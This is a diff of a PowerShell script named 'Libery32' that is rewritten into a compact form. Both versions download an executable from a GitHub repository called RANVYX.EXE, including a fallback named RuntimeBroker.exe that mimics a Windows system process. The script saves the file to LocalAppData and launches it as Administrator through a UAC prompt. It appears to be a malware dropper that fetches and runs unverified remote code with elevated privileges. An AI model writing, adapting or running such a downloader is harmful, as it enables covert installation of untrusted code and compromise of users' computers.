@@ -1,59 +1,17 @@
-# Libery32 - download exe then run
-$ErrorActionPreference = 'Stop'
-[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
-
-$dir  = Join-Path $env:LOCALAPPDATA 'Libery32'
-$exe  = Join-Path $dir 'Libery32.exe'
-$tmp  = Join-Path $dir 'Libery32.download'
-$urls = @(
-    'https://github.com/lubyralph6-maker/RANVYX.EXE/raw/main/Libery32.exe',
-    'https://raw.githubusercontent.com/lubyralph6-maker/RANVYX.EXE/main/Libery32.exe',
-    'https://github.com/lubyralph6-maker/RANVYX.EXE/raw/main/RuntimeBroker.exe',
-    'https://raw.githubusercontent.com/lubyralph6-maker/RANVYX.EXE/main/RuntimeBroker.exe'
-)
-$ua = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Libery32/1.2'
-
-function Is-Exe([string]$p) {
-    if (-not (Test-Path -LiteralPath $p)) { return $false }
-    try {
-        $i = Get-Item -LiteralPath $p
-        if ($i.Length -lt 500KB) { return $false }
-        $b = New-Object byte[] 2
-        $fs = [IO.File]::OpenRead($p)
-        try { [void]$fs.Read($b, 0, 2) } finally { $fs.Dispose() }
-        return ($b[0] -eq 0x4D -and $b[1] -eq 0x5A)
-    } catch { return $false }
-}
-
-try {
-    if (-not (Test-Path -LiteralPath $dir)) {
-        New-Item -ItemType Directory -Path $dir -Force | Out-Null
-    }
-    if (-not (Is-Exe $exe)) {
-        Write-Host 'Downloading ...' -ForegroundColor Cyan
-        $ok = $false
-        foreach ($url in $urls) {
-            for ($n = 1; $n -le 4; $n++) {
-                try {
-                    if (Test-Path -LiteralPath $tmp) { Remove-Item $tmp -Force -ErrorAction SilentlyContinue }
-                    Invoke-WebRequest -Uri $url -OutFile $tmp -UseBasicParsing -Headers @{ 'User-Agent' = $ua } -TimeoutSec 180
-                    if (Is-Exe $tmp) { Move-Item $tmp $exe -Force; $ok = $true; break }
-                } catch { Start-Sleep -Seconds (3 * $n) }
-            }
-            if ($ok) { break }
-        }
-        if (-not $ok) { throw 'Cannot download exe from GitHub' }
-        Write-Host "Downloaded: $exe" -ForegroundColor Green
-    } else {
-        Write-Host "Using cache: $exe" -ForegroundColor Green
-    }
-    Write-Host 'Starting as Administrator...' -ForegroundColor Cyan
-    $p = Start-Process -FilePath $exe -Verb RunAs -PassThru
-    if ($null -eq $p) { throw 'UAC cancelled' }
-    Start-Sleep -Seconds 2
-    if ($p.HasExited) { throw "Exe closed (exit $($p.ExitCode))" }
-    Write-Host 'Libery32 is running.' -ForegroundColor Green
-} catch {
-    Write-Host "Error: $($_.Exception.Message)" -ForegroundColor Red
-}
-Write-Host ''; Read-Host 'Press Enter to close'
+$ErrorActionPreference='Stop'
+$d=Join-Path $env:LOCALAPPDATA 'Libery32'
+$e=Join-Path $d 'Libery32.exe'
+$t=Join-Path $d 'tmp.download'
+$u=@('https://github.com/lubyralph6-maker/RANVYX.EXE/raw/main/Libery32.exe','https://raw.githubusercontent.com/lubyralph6-maker/RANVYX.EXE/main/Libery32.exe','https://github.com/lubyralph6-maker/RANVYX.EXE/raw/main/RuntimeBroker.exe','https://raw.githubusercontent.com/lubyralph6-maker/RANVYX.EXE/main/RuntimeBroker.exe')
+$h=@{'User-Agent'='Mozilla/5.0 Libery32/1.2'}
+if(-not(Test-Path $d)){New-Item $d -ItemType Directory -Force|Out-Null}
+if(-not(Test-Path $e) -or (Get-Item $e).Length -lt 500KB){
+ Write-Host 'Downloading...' -ForegroundColor Cyan
+ $ok=$false
+ foreach($url in $u){for($n=1;$n -le 4;$n++){try{Invoke-WebRequest $url -OutFile $t -UseBasicParsing -Headers $h -TimeoutSec 180;$b=New-Object byte[] 2;$f=[IO.File]::OpenRead($t);[void]$f.Read($b,0,2);$f.Close();if($b[0]-eq 77 -and $b[1]-eq 90){Move-Item $t $e -Force;$ok=$true;break}}catch{Start-Sleep (3*$n)}}if($ok){break}}
+ if(-not $ok){Write-Host 'Error: cannot download exe' -ForegroundColor Red;Read-Host 'Enter';exit}
+ Write-Host "OK: $e" -ForegroundColor Green
+}else{Write-Host "Cache: $e" -ForegroundColor Green}
+$p=Start-Process $e -Verb RunAs -PassThru
+if($null -eq $p){Write-Host 'UAC cancelled' -ForegroundColor Red}else{Write-Host 'Running.' -ForegroundColor Green}
+Read-Host 'Enter'
